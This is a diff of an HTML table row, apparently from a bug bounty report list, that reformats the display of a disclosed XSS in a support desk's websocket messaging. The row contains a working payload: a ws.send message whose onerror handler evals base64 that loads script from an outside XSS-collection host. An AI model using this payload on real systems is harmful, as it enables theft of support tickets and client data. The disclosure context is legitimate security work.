@@ -7089,44 +7089,11 @@
 </td>
 <td class="confluenceTd" colspan="1">XSS
 </td>
-<td class="confluenceTd" colspan="1">Due to taking unsantizied input from websockets and rendering it on the recipients side, it is possible to achieve XSS on support desk conversations and gain access to support tickets and client information. The payload was: `
+<td class="confluenceTd" colspan="1">Due to taking unsantizied input from websockets and rendering it on the recipients side, it is possible to achieve XSS on support desk conversations and gain access to support tickets and client information. The payload was:
 <pre class="highlight javascript">
 <code>
-<span class="nx">ws
-</span>
-<span class="p">.
-</span>
-<span class="nx">send
-</span>
-<span class="p">(
-</span>
-<span class="dl" style="color: #dd1144;">'
-</span>
-<span class="s1" style="color: #dd1144;">{"action":"send_message","data":{"type":2,"uuid":"katO0xuiIy","media_thumb":"xxdata
-</span>
-<span class="se" style="color: #dd1144;">\\
-</span>
-<span class="s1" style="color: #dd1144;">" onerror=
-</span>
-<span class="se" style="color: #dd1144;">\\
-</span>
-<span class="s1" style="color: #dd1144;">"eval(atob(
-</span>
-<span class="se" style="color: #dd1144;">\'
-</span>
-<span class="s1" style="color: #dd1144;">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcGl0ci54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7
-</span>
-<span class="se" style="color: #dd1144;">\'
-</span>
-<span class="s1" style="color: #dd1144;">));//","media_url":"media-url"},"uuid":"katO0xuiIy","token":"bz+OjfTeBL/BRozszXwKbT10voEb0crFVRWBktvQifQ=","projectId":1,"messengerType":9}
-</span>
-<span class="dl" style="color: #dd1144;">'
-</span>
-<span class="p">)
-</span>
-
+ws.send('{"action":"send_message","data":{"type":2,"uuid":"katO0xuiIy","media_thumb":"xxdata\\ onerror=\\"eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcGl0ci54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\'));//","media_url":"media-url"},"uuid":"katO0xuiIy","token":"bz+OjfTeBL/BRozszXwKbT10voEb0crFVRWBktvQifQ=","projectId":1,"messengerType":9}')
 </code>
-</pre>`
 </td>
 <td class="confluenceTd" colspan="1">$500
 </td>
